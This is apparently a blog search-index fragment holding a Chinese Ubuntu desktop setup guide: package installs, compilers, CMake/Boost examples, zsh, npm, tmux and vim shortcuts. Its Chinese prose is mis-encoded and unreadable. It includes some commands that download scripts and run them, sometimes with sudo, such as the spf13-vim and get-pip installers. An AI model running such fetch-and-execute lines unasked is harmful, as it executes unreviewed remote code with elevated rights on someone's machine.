æœ¬åœ°çš„æ–‡ä»¶ï¼Œä¿®æ”¹ä¹‹åå¯ä»¥éšæ—¶å³é”®deployment-&gt;uploadåˆ°è¿œç¨‹ä¸»æœºï¼Œæˆ–è€…ç›´æ¥åœ¨æœ¬åœ°è°ƒè¯•è¿è¡Œã€‚ dockerå®¹å™¨åœäº†ä»¥åé‡Œé¢çš„SSHæœåŠ¡ä¹Ÿä¼šç›¸åº”åœæ­¢ï¼Œ dockeré‡å¯æ—¶ä¹Ÿéœ€è¦é‡å¯sshæœåŠ¡ï¼š 1$ service ssh restart å‚è€ƒï¼š Dockerä¸­æ­å»ºæ·±åº¦å­¦ä¹ ç¯å¢ƒ","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Docker","slug":"Tools/Docker","permalink":"https://racleray.github.io/categories/Tools/Docker/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://racleray.github.io/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://racleray.github.io/tags/Docker/"},{"name":"NVIDIA Container Toolkit","slug":"NVIDIA-Container-Toolkit","permalink":"https://racleray.github.io/tags/NVIDIA-Container-Toolkit/"}]},{"title":"ä¸ªäººLinuxç¯å¢ƒé…ç½®","slug":"ä¸ªäººLinuxç¯å¢ƒé…ç½®","date":"2020-07-06T14:42:23.000Z","updated":"2023-08-07T11:54:31.038Z","comments":true,"path":"posts/2c27ec14.html","link":"","permalink":"https://racleray.github.io/posts/2c27ec14.html","excerpt":"è®°å½•ä¸ªäººæ¡Œé¢ç‰ˆLinuxé…ç½®è¿‡ç¨‹ã€‚ä½†æ˜¯åœ¨æœ¬æœºå®‰è£…åŒç³»ç»Ÿå¾ˆä¸ç¨³å®šï¼Œè™šæ‹Ÿæœºåœ¨æˆ‘çš„å°ç ´ç¬”è®°æœ¬ä¸Šä¹Ÿè¡¨ç°å¾ˆä¸€èˆ¬ï¼Œæœ€åè¿˜æ˜¯è½¬æˆ˜äº‘ä¸»æœºäº†ã€‚","text":"æ›´æ–°æº æ‰¾åˆ°Software &amp; Updatesï¼Œå°†æºæ›´æ–°ä¸ºé˜¿é‡Œäº‘çš„æº åœ¨Other Softwareé‡Œå°†Canonical Partnerså‹¾ä¸Š ç„¶åè‡ªå·±æ‰‹åŠ¨æ›´æ–°ä¸€ä¸‹ï¼š 123sudo apt updatesudo apt upgrade Sougou Pinyin 123456sudo apt-get install fcitx-binsudo apt-get install fcitx-table # æœç‹—è¾“å…¥æ³•Linuxå®˜ç½‘ https://pinyin.sogou.com/linux/ ä¸‹è½½64bitçš„ç¨‹åºsudo dpkg -i sogoupinyin*.deb é‡å¯ æ‰¾åˆ°Fcitx Configureï¼Œè®¾ç½®è¾“å…¥æ³• æˆªå›¾è½¯ä»¶ Shutter ä¸‹è½½libgoocanvas-commonã€libgoocanvas3ã€libgoo-canvas-perl 12345sudo dpkg -i libgoocanvas-common*.debsudo dpkg -i libgoocanvas3*.debsudo dpkg -i libgoo-canvas-perl*deb å°†ä¸Šè¿°ä¸‰ä¸ªåŒ…ç»™å®‰è£…ä¸Šï¼Œè‹¥å®‰è£…å¤±è´¥ï¼Œæ‰§è¡Œä¸‹é¢ä»£ç : 1sudo apt-get install -f ç„¶åå†å®‰è£…è¿™å‡ ä¸ªåŒ… è§†é¢‘å’ŒéŸ³é¢‘ å®‰è£…è§£ç å™¨ï¼š 1sudo apt-get install ubuntu-restricted-extras å®‰è£…VLCè§†é¢‘æ’­æ”¾å™¨ 1sudo apt-get install vlc browser-plugin-vlc å®‰è£…FFmpeg 1sudo apt-get install ffmpeg ç½‘æ˜“äº‘éŸ³ä¹ å®˜ç½‘ è®¾ç½®: ç‚¹å‡»å›¾æ ‡æœ€å°åŒ– 1gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'minimize' ç¾åŒ– 123456789sudo apt-get install gnome-tweak-tool #å®‰è£…tweaksudo apt-get install gnome-shell-extensions -y #å®‰è£…shellæ‰©å±•sudo apt install chrome-gnome-shell #ä¸ºäº†èƒ½åœ¨æµè§ˆå™¨å†…å®‰è£…gnomeæ’ä»¶ï¼Œç«ç‹å’Œè°·æ­Œéƒ½èƒ½ç”¨sudo apt-get install gtk2-engines-pixbuf #é˜²æ­¢GTK2é”™è¯¯sudo apt install libxml2-utils ä»gnome-lookè¿™é‡Œä¸‹è½½ï¼Œæˆ–è€…é€šè¿‡plingå’Œ ocs-urlç›´æ¥å®‰è£… æˆ–è€…æ‰‹åŠ¨ä¸‹è½½ä¸‹æ¥ï¼Œæ¥ä¸‹æ¥è§£å‹åˆ°æŒ‡å®šæ–‡ä»¶å¤¹ï¼Œå¹¶å®‰è£…ä»–ä»¬ã€‚ 1234567xz -d Gnome-OSC-HS-light-menu*.tar.xztar -xvf Gnome-OSC-HS-light-menu*.tar -C /usr/share/themes/xz -d Gnome-OSC-HS--2*.tar.xztar -xvf Gnome-OSC-HS--2*.tar -C /usr/share/themes/ å›¾æ ‡ï¼š/usr/share/icons/ å…¶ä»–ä¸»é¢˜ï¼š/usr/share/themes/ å¦‚æœShellæ˜¾ç¤ºä¸å¯ä¿®æ”¹ï¼Œ 1sudo apt install gnome-shell-extensions å®‰è£…å‹ç¼©è½¯ä»¶ 1sudo apt-get install p7zip-full p7zip-rar rar unzip Chrome Brower 123wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.debsudo dpkg -i google-chrome*; sudo apt-get -f install å®‰è£…å¤šç‰ˆæœ¬gccå’Œg++ï¼Œå¹¶å…±å­˜ 1234567891011121314151617181920212223sudo apt-get install gcc-5 gcc-5-multilibsudo apt-get install g++-5 g++-5-multilibsudo apt-get install gcc-6 gcc-6-multilibsudo apt-get install g++-6 g++-6-multilibsudo apt-get install gcc-7 gcc-7-multilibsudo apt-get install g++-7 g++-7-multilibsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-6 60sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 70sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-5 50sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-6 60sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-7 70 ç„¶åé€‰æ‹©gccå’Œg++ç‰ˆæœ¬ 123sudo update-alternatives --config gccsudo update-alternatives --config g++ CMAKE https://cmake.org/download/ å®‰è£…åœ¨/optä¸‹ï¼Œè½¯è¿æ¥åˆ°/usr/bin/ 1sudo ln -sf /opt/cmake-3.17.1/bin/* /usr/bin/ complete cmake process with following libs:(boostç‰ˆæœ¬è¾ƒä½ï¼Œéœ€è¦æ‰‹åŠ¨å®‰è£…è¾ƒé«˜ç‰ˆæœ¬ï¼Œè§ä¸‹æ–‡Boostéƒ¨åˆ†) 1sudo apt-get install cmake libblkid-dev e2fslibs-dev libboost-all-dev libaudit-dev openSSL 1sudo apt install libssl-dev ç¼–å†™ç®€å•çš„cmake https://cmake.org/cmake/help/v3.17/guide/tutorial/index.html ä½¿ç”¨cmakeé¦–å…ˆå¾—æœ‰ä¸ªCMakeList.txtæ–‡ä»¶ï¼Œä½ éœ€è¦æŠŠé…ç½®ä¿¡æ¯å†™åœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡cmakeå»å¤„ç†è¯¥æ–‡ä»¶ã€‚ å°†è®¾æœ‰ä¸‹é¢ä¸€ä¸ªmain.cppæ–‡ä»¶ 1234567//main.cppæ–‡ä»¶\\#include&lt;iostream&gt;using namespace std;int main()&#123;cout&lt;&lt;\"hello world!\"&lt;&lt;endl;return 0;&#125; è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å†™ä¸ªå¦‚ä¸‹çš„CMakeList.txtæ–‡ä»¶ 1234567891011\\#cmakeæœ€å°éœ€è¦ç‰ˆæœ¬cmake_minimum_required(VERSION 2.8)\\#é¡¹ç›®åå­—project(HELLOWORLD)\\#åŒ…å«åŸç¨‹åº,å³æŠŠç»™å®šç›®å½•ä¸‹çš„æºç¨‹åºå¤åˆ¶ç»™å˜é‡DIR_SRCaux_source_directory(DIR_SRC ./)\\#ç”Ÿæˆç¨‹åºadd_executable(helloworld $&#123;DIR_SRC&#125;) ç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ 12345mkdir buildcd buildcmake ..make./helloworld è¿™æ ·å°±ç¼–è¯‘å¥½ç¨‹åºå¹¶è¿è¡Œã€‚ æ·»åŠ é™æ€åº“æˆ–è€…åŠ¨æ€åº“ è€Œå‡è®¾æˆ‘ä»¬ç¨‹åºç”¨åˆ°äº†åœ¨/usr/libä¸‹çš„ä¸€ä¸ªé™æ€åº“libmy.aï¼Œé‚£å°±éœ€è¦æ·»åŠ å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤ 12345\\#åº“æ‰€åœ¨ä½ç½®link_directories(/usr/lib)\\#ç¨‹åºç¼–è¯‘æ—¶å€™é“¾æ¥åº“target_link_libraries(helloworld my) Boost ä¸‹è½½https://www.boost.org/users/history/version_1_72_0.html 1sudo tar -zxvf boost_1_72_0.tar.gz -C /usr/local/ Booståº“çš„ç¼–è¯‘å®‰è£…è¿˜æœ‰ä¸€äº›ä¾èµ–åº“ï¼Œéœ€è¦å…ˆå®‰è£… 1sudo apt-get install mpi-default-dev libicu-dev python-dev libbz2-dev å›åˆ°booståº“çš„è·¯å¾„ä¸‹ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ 12sudo ./bootstrap.shsudo ./b2 install --prefix=/usr --build-dir=tmp/build-boost --prefixåé¢è·Ÿçš„æ˜¯ä½ å®‰è£…booståº“çš„è·¯å¾„ï¼Œå®‰è£…å®Œæˆåæ‰€æœ‰çš„å¤´æ–‡ä»¶å’Œlibåº“éƒ½ä¼šä¿å­˜åœ¨è¿™ä¸ªè·¯å¾„ä¸‹ è‹¥ ./b2ä¸åŠ  install --prefix=/usr ä¼šç¼–è¯‘åˆ°å½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œå®‰è£…æ²¡æœ‰é“¾æ¥æˆåŠŸï¼Œå› æ­¤æ‰‹åŠ¨é“¾æ¥ã€‚ 12sudo ln -sf /usr/local/boost_1_72_0/boost/* /usr/include/boost/include/sudo ln -sf /usr/local/boost_1_72_0/stage/lib/* /usr/include/boost/lib/ ç„¶ååŠ å…¥ç¯å¢ƒå˜é‡/etc/profile 1export env=$PATH:/usr/include/boost åªæ˜¯ç”¨å¤´æ–‡ä»¶ç¤ºä¾‹ç¨‹åº ä¸éœ€è¦å…ˆç¼–è¯‘boostï¼Œç›´æ¥å¼•å…¥å¤´æ–‡ä»¶å°±è¡Œã€‚ è¿™ä¸ªç¨‹åºç”¨åˆ°äº†boostæä¾›çš„æ­£åˆ™åŒ¹é…åº“ 123456789101112131415161718#include &lt;boost/regex.hpp&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123; std::string line; boost::regex pat(\"tcp:*\"); while(std::cin) &#123; std::getline(std::cin, line); boost::smatch matches; if(boost::regex_match(line, matches, pat)) std::cout &lt;&lt; matches[0] &lt;&lt; std::endl; &#125;&#125; ä¾æ—§é€šè¿‡CMakeè¿›è¡Œç¼–è¯‘ é¦–å…ˆè®¾ç½®Booståº“çš„è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰çš„å®‰è£…è·¯å¾„ ç„¶åä½¿ç”¨find_packageæ¥æœç´¢è¿™ä¸ªè·¯å¾„ä¸‹é¢æ˜¯å¦æœ‰éœ€è¦çš„regexåº“ æœ€åè®¾ç½®å¤´æ–‡ä»¶æœç´¢è·¯å¾„ä»¥åŠæŠŠæ‰¾åˆ°çš„åº“linkåˆ°åº”ç”¨ç¨‹åº 1234567891011121314project(tutorial-0)cmake_minimum_required(VERSION 3.5)set(CMAKE_CXX_STANDARD 14)set(BOOST_ROOT /usr/local/boost_1_72_0)find_package(Boost COMPONENTS regex REQUIRED)if(Boost_FOUND) include_directories($&#123;Boost_INCLUDE_DIRS&#125;) add_executable(foo foo.cpp) target_link_libraries (foo $&#123;Boost_LIBRARIES&#125;)endif() ç¼–è¯‘å®Œæˆåè¿è¡ŒappæŸ¥çœ‹ç»“æœ å¤šç‰ˆæœ¬pythonå’Œpipå…±å­˜ ubuntu18.04è‡ªå¸¦python3ï¼Œä½†æ˜¯æ²¡æœ‰python2ï¼Œpip2ï¼Œpip3 12345678910111213141516171819202122232425sudo apt install curlsudo apt-get install python3-distutilssudo apt-get install python3-testresourcessudo apt-get install python3-widgetsnbextensionsudo apt install python-minimalsudo apt install python2.7curl https://bootstrap.pypa.io/get-pip.py -o get-pip.pysudo python3 get-pip.py #å®‰è£…pip3sudo python2 get-pip.py #å®‰è£…pip3sudo pip3 install --upgrade pip #å‡çº§pip3sudo pip2 install --upgrade pip #å‡çº§pip2# æ­¤æ—¶pipå’Œpythonå¹¶ä¸çŸ¥é“æŒ‡å‘2è¿˜æ˜¯3ï¼Œéœ€è¦è‡ªå·±ä¿®æ”¹ã€‚æˆ‘ä»¬ä½¿ç”¨aliasæ¥è®¾ç½®åˆ«åvim /etc/profile # æ‰€æœ‰ç”¨æˆ· ã€‚ä¿®æ”¹~/.bashrcæˆ–è€….profileåªä¼šä¿®æ”¹å½“å‰ç”¨æˆ·# å†™å…¥ alias pip=/usr/local/bin/pip3.6 alias python=/usr/bin/python3.6source /etc/profile VS Code å¾®è½¯å®˜ç½‘ä¸‹è½½debå®‰è£…å³å¯ Git 1sudo apt install git æœ‰é“è¯å…¸ å®˜ç½‘ä¸‹è½½å®‰è£…å³å¯ typora å®˜ç½‘æ‰“åŒ…çš„äºŒè¿›åˆ¶ Typora åœ¨ Ubuntu (gnome) ä¸Šå®‰è£…ä¸ºåº”ç”¨ç¨‹åºï¼ˆå¯è¢«é€‰æ‹©ä¸ºé»˜è®¤ç¨‹åºï¼‰ 12345678910111213141516171819202122$ cd Downloads/Software$ wget https://typora.io/linux/Typora-linux-x64.tar.gz$ tar -xzvf Typora-linux-x64.tar.gz$$ sudo mv Typora-linux-x64 /opt/$ $ cd /opt/Typora-linux-x64/$ ./Typora # test could run ?$ cd /usr/share/applications/Typora.desktop$ sudo vim Typora.desktop[Desktop Entry]Name=TyporaGenericName=EditorComment=Typroa - a markdown editorExec=\"/opt/Typora-linux-x64/Typora\" %UIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_256x256.pngTerminal=falseCategories=Markdown;StartupNotify=falseType=Application sublime-text https://www.sublimetext.com/docs/3/linux_repositories.html#apt jetbrains https://www.jetbrains.com/toolbox-app/ Terminator æ–°çš„shellç•Œé¢ å¸¸ç”¨å¿«æ·é”® å¿«æ·é”® ä½œç”¨ Ctrl+Shift+E å‚ç›´åˆ†å‰²çª—å£ Ctrl+Shift+O æ°´å¹³åˆ†å‰²çª—å£ Ctrl+Shift+W å…³é—­å½“å‰çª—æ ¼ Ctrl+Shift+C å¤åˆ¶ Ctrl+Shift+V ç²˜è´´ Ctrl+Shift+X æ”¾å¤§æˆ–ç¼©å°æŸä¸€çª—å£ Ctrl+Shift+Z ä»æ”¾å¤§çª—å£å›åˆ°å¤šçª—æ ¼ç•Œé¢ ALT+â†‘[â†“,â†,â†’] ç§»åŠ¨åˆ°ä¸Š[ä¸‹ã€å·¦ã€å³]é¢ä¸€ä¸ªçª—å£ Ctrl+Tab åˆ‡æ¢çª—å£ Ctrl+- ç¼©å°å­—ä½“ Ctrl+Shift+=ä¹Ÿå°±æ˜¯Ctrl++ æ”¾å¤§å­—ä½“ Zsh fish ä½¿ç”¨oh-my-zshæ¥è‡ªåŠ¨ç®¡ç†é…ç½®ï¼Œå¯ä»¥æŸ¥çœ‹å®˜ç½‘ï¼šhttps://ohmyz.sh/ zshå®˜æ–¹çš„antigenæ¥ç®¡ç† https://github.com/zsh-users/antigen 1234567sudo apt install zsh# åˆ‡æ¢åˆ°zshchsh -s /bin/zsh curl -L git.io/antigen &gt; antigen.zsh # æˆ–è€…ç›´æ¥åœ¨git.io/antigenä¸‹è½½æ–‡æœ¬# or use git.io/antigen-nightly for the latest version# or apt-get install zsh-antigen åœ¨ ~/.zshrc ä¸­æ·»åŠ ä¸‹é¢çš„å†…å®¹ 1234567891011121314151617181920212223242526272829source ~/antigen.zsh# Load the oh-my-zsh's library.antigen use oh-my-zsh# Bundles from the default repo (robbyrussell's oh-my-zsh).antigen bundle brewantigen bundle command-not-foundantigen bundle dockerantigen bundle docker-composeantigen bundle gemantigen bundle gitantigen bundle golangantigen bundle ngantigen bundle osxantigen bundle pip# Syntax highlighting bundle.antigen bundle zsh-users/zsh-syntax-highlightingantigen bundle zsh-users/zsh-completionsantigen bundle zsh-users/zsh-autosuggestionsantigen bundle zsh-users/zsh-apple-touchbar# Load the theme.# antigen theme robbyrussellantigen theme https://github.com/denysdovhan/spaceship-prompt spaceship# Tell Antigen that you're done.antigen apply è¿›å…¥zsh ä¹±ç é—®é¢˜ 1234git clone https://github.com/powerline/fonts.git# installcd fonts./install.sh åœ¨ä¼˜åŒ–ä¸­è®¾ç½®ç­‰å®½å­—ä½“ä¸ºpowerlineç±»å‹å­—ä½“ä¸­çš„ä¸€ä¸ª å…¶ä»–é€‰æ‹©ï¼šfish https://link.zhihu.com/?target=https%3A//wiki.archlinux.org/index.php/Fish TLDR https://tldr.sh/ï¼šå¸¸ç”¨å‘½ä»¤èŒƒå¼æŸ¥æ‰¾å·¥å…· æ–‡ä»¶æŸ¥æ‰¾ find locate fdï¼šfd is a simple, fast and user-friendly alternative to find. ä»£ç æŸ¥æ‰¾ é‡è¦çš„æ˜¯ï¼šæœ‰äº›é—®é¢˜ä½¿ç”¨åˆé€‚çš„å·¥å…·å°±ä¼šè¿åˆƒè€Œè§£ï¼Œè€Œå…·ä½“é€‰æ‹©å“ªä¸ªå·¥å…·åˆ™ä¸æ˜¯é‚£ä¹ˆé‡è¦ grep ack, ag å’Œ rg æŸ¥æ‰¾Shellå†å² Ctrl+R å¯¹å‘½ä»¤å†å²è®°å½•è¿›è¡Œå›æº¯æœç´¢ æ–‡ä»¶å¤¹å¯¼èˆª fasdï¼šæŸ¥æ‰¾æœ€å¸¸ç”¨å’Œ/æˆ–æœ€è¿‘ä½¿ç”¨çš„æ–‡ä»¶å’Œç›®å½• æ¦‚è§ˆç›®å½•ç»“æ„ï¼Œä¾‹å¦‚ tree, broot æ›´å®Œæ•´çš„æ–‡ä»¶ç®¡ç†å™¨ï¼Œä¾‹å¦‚ nnn æˆ– ranger npm 1234567sudo apt-get install nodejssudo apt-get install npmnpm -vnpm config set registry https://registry.npm.taobao.org å®‰è£…nrmå·¥å…·ï¼Œç”¨äºç®¡ç†è½¯ä»¶æºã€‚ 123$ sudo npm install -g nrm$ nrm ls åœ¨ç‰¹å®šç½‘ç»œç¯å¢ƒä¸‹éœ€è¦é…ç½®ä»£ç†çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é…ç½®ã€‚ 123$ npm config set proxy http://127.0.0.1:3128$ npm config set http-proxy http://127.0.0.1:3128$ npm config set https-proxy https://127.0.0.1:3128 vim å®‰è£…VIM 1apt-get install vim https://spacevim.org/documentation/ï¼šspacevimæ’ä»¶é›†åˆ or https://github.com/spf13/spf13-vimï¼šä¸€é”®é…ç½®æ’ä»¶é›†åˆ http://vim.spf13.com/#install 1curl https://j.mp/spf13-vim3 -L &gt; spf13-vim.sh &amp;&amp; sh spf13-vim.sh - tmux Ubuntuå¹¶ä¸è‡ªå¸¦tmuxï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œå®‰è£…ï¼š æŒ‰ä¸‹ Ctrl + d æˆ–è€…ç›´æ¥åœ¨å‘½ä»¤è¡Œè¾“å…¥ exit æŒ‡ä»¤ï¼Œå°±å¯ä»¥é€€å‡ºTmuxçª—å£ã€‚ Tmuxçª—å£æœ‰å¾ˆå¤šçš„å¿«æ·é”®ï¼Œæ‰€æœ‰çš„å¿«æ·é”®éƒ½éœ€è¦å‰ç¼€é”®ã€‚é»˜è®¤çš„å‰ç¼€é”®æ˜¯ Ctrl + bï¼Œåªæœ‰å…ˆæŒ‰ä¸‹ Ctrl + bï¼Œå¿«æ·é”®æ‰èƒ½ç”Ÿæ•ˆã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¸®åŠ©æŒ‡ä»¤çš„å¿«æ·é”®æ˜¯ Ctrl + b ?ã€‚é‚£ä¹ˆåœ¨Tmuxçª—å£ä¸‹ï¼Œå…ˆæŒ‰ä¸‹ Ctrl + bï¼Œå†æŒ‰ä¸‹ ?ï¼Œå°±èƒ½æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚ tmuxé‡è¦æŒ‡ä»¤çš„æ€»ç»“ï¼š tmux new -s æ–°å»ºä¸€ä¸ªç‰¹å®šåç§°çš„ä¼šè¯ tmux detach å°†å½“å‰ä¼šè¯ä¸çª—å£åˆ†ç¦» tmux ls / tmux list-session æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„Tmuxä¼šè¯ tmux attach -t é‡æ–°è¿æ¥æŸä¸ªå·²å­˜åœ¨çš„ä¼šè¯ tmux kill-session -t åˆ é™¤æŸä¸ªä¼šè¯ tmux switch -t åˆ‡æ¢ä¼šè¯ tmux rename-session -t é‡æ–°å‘½åä¼šè¯ ä¼šè¯ç›¸å…³çš„å¿«æ·é”®ï¼š Ctrl + b d åˆ†ç¦»ä¼šè¯ Ctrl + b s åˆ—å‡ºæ‰€æœ‰ä¼šè¯ Ctrl + b $ é‡å‘½åå½“å‰ä¼šè¯ Tmuxå¯ä»¥åœ¨ä¸€ä¸ªçª—å£ä¸­åˆ†å‡ºå¤šä¸ªçª—æ ¼ (pane)ï¼Œæ¯ä¸ªçª—æ ¼å¯ä»¥è¿è¡Œä¸åŒçš„æŒ‡ä»¤ã€‚ä»¥ä¸‹æ˜¯ç›¸å…³å¿«æ·é”®ï¼š Ctrl+b % åˆ’åˆ†å·¦å³ä¸¤ä¸ªçª—æ ¼ Ctrl+b â€œ åˆ’åˆ†ä¸Šä¸‹ä¸¤ä¸ªçª—æ ¼ Ctrl+b åˆ‡æ¢åˆ°å…¶ä»–çª—æ ¼ï¼ŒæŒ‡å‘åˆ‡æ¢çš„æ–¹å‘ Ctrl+b ; åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªçª—æ ¼ Ctrl+b o åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªçª—æ ¼ Ctrl+b { å½“å‰çª—æ ¼å·¦ç§» Ctrl+b } å½“å‰çª—æ ¼å³ç§» Ctrl+b x å…³é—­å½“å‰çª—æ ¼ - ä»£ç æŠ˜å  zc å…³é—­å½“å‰æ‰“å¼€çš„æŠ˜å  zo æ‰“å¼€å½“å‰çš„æŠ˜å  zm å…³é—­æ‰€æœ‰æŠ˜å  zM å…³é—­æ‰€æœ‰æŠ˜å åŠå…¶åµŒå¥—çš„æŠ˜å  zr æ‰“å¼€æ‰€æœ‰æŠ˜å  zR æ‰“å¼€æ‰€æœ‰æŠ˜å åŠå…¶åµŒå¥—çš„æŠ˜å  zd åˆ é™¤å½“å‰æŠ˜å  zE åˆ é™¤æ‰€æœ‰æŠ˜å  zj ç§»åŠ¨è‡³ä¸‹ä¸€ä¸ªæŠ˜å  zk ç§»åŠ¨è‡³ä¸Šä¸€ä¸ªæŠ˜å  zn ç¦ç”¨æŠ˜å  zN å¯ç”¨æŠ˜å  SimpleScreenRecorder 1sudo apt-get install simplescreenrecorder Dumb downloader that scrapes the web : tget is wget for torrents Unity Tweak å·¥å…· 1sudo apt-get install unity-tweak-tool ä½¿ç”¨ parcelliteå‰ªåˆ‡æ¿ 12$ sudo apt-get install parcellite$ parcellite è®¾ç½®ç™»å½•èƒŒæ™¯ å‡è®¾æˆ‘ç°åœ¨ç”¨çš„å›¾ç‰‡æ˜¯mypicture.jpg , å°†å®ƒç§»åŠ¨åˆ°/usr/share/backgrounds/ç›®å½•ä¸‹ 1sudo mv currentdir&#x2F;mypicture.jpg &#x2F;usr&#x2F;share&#x2F;backgrounds&#x2F; Ubuntuç°åœ¨ç”¨çš„Gnomeçš„æ¡Œé¢ï¼Œå’Œä»¥å‰Unityæ—¶å€™çš„é…ç½®æ–‡ä»¶ä¸ä¸€æ ·ï¼Œæ‰€ä»¥16.04çš„æ•™ç¨‹æ˜¯ç”¨ä¸äº†çš„ï¼Œ18.04ç™»å½•èƒŒæ™¯ç›¸å…³çš„é…ç½®æ˜¯ç”¨cssçš„ï¼š/etc/alternatives/gdm3.css 1sudo gedit /etc/alternatives/gdm3.css 123456789101112#æ‰¾åˆ°é»˜è®¤çš„è¿™ä¸ªéƒ¨åˆ†#lockDialogGroup &#123; background: #2c001e url(resource:///org/gnome/shell/theme/noise-texture.png); background-repeat: repeat; &#125;#æ”¹ä¸º#lockDialogGroup &#123; background: #2c001e url(file:///usr/share/backgrounds/mypicture.jpg); background-repeat: no-repeat; background-size: cover; background-position: center; &#125; ä¿å­˜å¹¶é‡å¯. apt-getä½¿ç”¨ apt-getå‘½ä»¤æœ¬èº«å¹¶ä¸å…·æœ‰ç®¡ç†è½¯ä»¶åŒ…åŠŸèƒ½ï¼Œåªæ˜¯æä¾›äº†ä¸€ä¸ªè½¯ä»¶åŒ…ç®¡ç†çš„å‘½ä»¤è¡Œå¹³å°ã€‚ apt-getå‘½ä»¤çš„ä¸€èˆ¬è¯­æ³•æ ¼å¼ä¸ºï¼š apt-get subcommands [ -d | -f | -m | -q | --purge | --reinstall | - b | - s | - y | - u | - h | -v ] [pkg] apt-cacheæä¾›äº†æœç´¢åŠŸèƒ½ã€‚ æ›´æ–°æˆ–å‡çº§æ“ä½œï¼š apt-get update # æ›´æ–°æº apt-get upgrade # æ›´æ–°æ‰€æœ‰å·²å®‰è£…çš„åŒ… apt-get dist-upgrade # å‘è¡Œç‰ˆå‡çº§ï¼ˆå¦‚ï¼Œä»10.10åˆ°11.04ï¼‰ å®‰è£…æˆ–é‡è£…ç±»æ“ä½œï¼š apt-get install # å®‰è£…è½¯ä»¶åŒ…ï¼Œå¤šä¸ªè½¯ä»¶åŒ…ç”¨ç©ºæ ¼éš”å¼€ apt-get install --reinstall # é‡æ–°å®‰è£…è½¯ä»¶åŒ… apt-get install -f # ä¿®å¤å®‰è£…ï¼ˆç ´æŸçš„ä¾èµ–å…³ç³»ï¼‰è½¯ä»¶åŒ… å¸è½½ç±»æ“ä½œï¼š apt-get remove # åˆ é™¤è½¯ä»¶åŒ…ï¼ˆä¸åŒ…æ‹¬é…ç½®æ–‡ä»¶ï¼‰ apt-get purge # åˆ é™¤è½¯ä»¶åŒ…ï¼ˆåŒ…æ‹¬é…ç½®æ–‡ä»¶ï¼‰ ä¸‹è½½æ¸…é™¤ç±»æ“ä½œï¼š apt-get source # ä¸‹è½½pkgåŒ…çš„æºä»£ç åˆ°å½“å‰ç›®å½• apt-get download # ä¸‹è½½pkgåŒ…çš„äºŒè¿›åˆ¶åŒ…åˆ°å½“å‰ç›®å½• apt-get source -d # ä¸‹è½½å®Œæºç åŒ…åï¼Œç¼–è¯‘ apt-get build-dep # æ„å»ºpkgæºç åŒ…çš„ä¾èµ–ç¯å¢ƒï¼ˆç¼–è¯‘ç¯å¢ƒï¼Ÿï¼‰ apt-get clean # æ¸…é™¤ç¼“å­˜(/var/cache/apt/archives/{,partial}ä¸‹)ä¸­æ‰€æœ‰å·²ä¸‹è½½çš„åŒ… apt-get autoclean # ç±»ä¼¼äºcleanï¼Œä½†æ¸…é™¤çš„æ˜¯ç¼“å­˜ä¸­è¿‡æœŸçš„åŒ…ï¼ˆå³å·²ä¸èƒ½ä¸‹è½½æˆ–è€…æ˜¯æ— ç”¨çš„åŒ…ï¼‰ apt-get autoremove # åˆ é™¤å› å®‰è£…è½¯ä»¶è‡ªåŠ¨å®‰è£…çš„ä¾èµ–ï¼Œè€Œç°åœ¨ä¸éœ€è¦çš„ä¾èµ–åŒ… æŸ¥è¯¢ç±»æ“ä½œï¼š apt-cache stats # æ˜¾ç¤ºç³»ç»Ÿè½¯ä»¶åŒ…çš„ç»Ÿè®¡ä¿¡æ¯ apt-cache search # ä½¿ç”¨å…³é”®å­—pkgæœç´¢è½¯ä»¶åŒ… apt-cache show # æ˜¾ç¤ºè½¯ä»¶åŒ…pkg_nameçš„è¯¦ç»†ä¿¡æ¯ apt-cache depends # æŸ¥çœ‹pkgæ‰€ä¾èµ–çš„è½¯ä»¶åŒ… apt-cache rdepends # æŸ¥çœ‹pkgè¢«é‚£äº›è½¯ä»¶åŒ…æ‰€ä¾èµ– å…³äºè½¯ä»¶å®‰è£…ç›®å½•çš„è¯´æ˜ï¼š ä¸€èˆ¬çš„debåŒ…(åŒ…æ‹¬æ–°ç«‹å¾—æˆ–è€…apt-getä¸‹è½½çš„)éƒ½åœ¨/usr/shareã€‚ è‡ªå·±ä¸‹è½½çš„å‹ç¼©åŒ…æˆ–è€…ç¼–è¯‘çš„åŒ…ï¼Œæœ‰äº›å¯ä»¥é€‰æ‹©å®‰è£…ç›®å½•ï¼Œä¸€èˆ¬æ”¾åœ¨/usr/local/ï¼Œä¹Ÿæœ‰åœ¨/optçš„ã€‚ å…³äºapt-getçš„ç¼“å­˜ç›®å½•ï¼š é»˜è®¤çš„ç¼“å­˜ç›®å½•æ˜¯/var/cache/apt/archives/ ä¸ºæ—¥åé‡è£…ç³»ç»Ÿåå®‰è£…è½¯ä»¶èŠ‚çœä¸‹è½½æ—¶é—´æˆ–è€…å°†è½¯ä»¶åŒ…ç»™åˆ«äººç”¨ 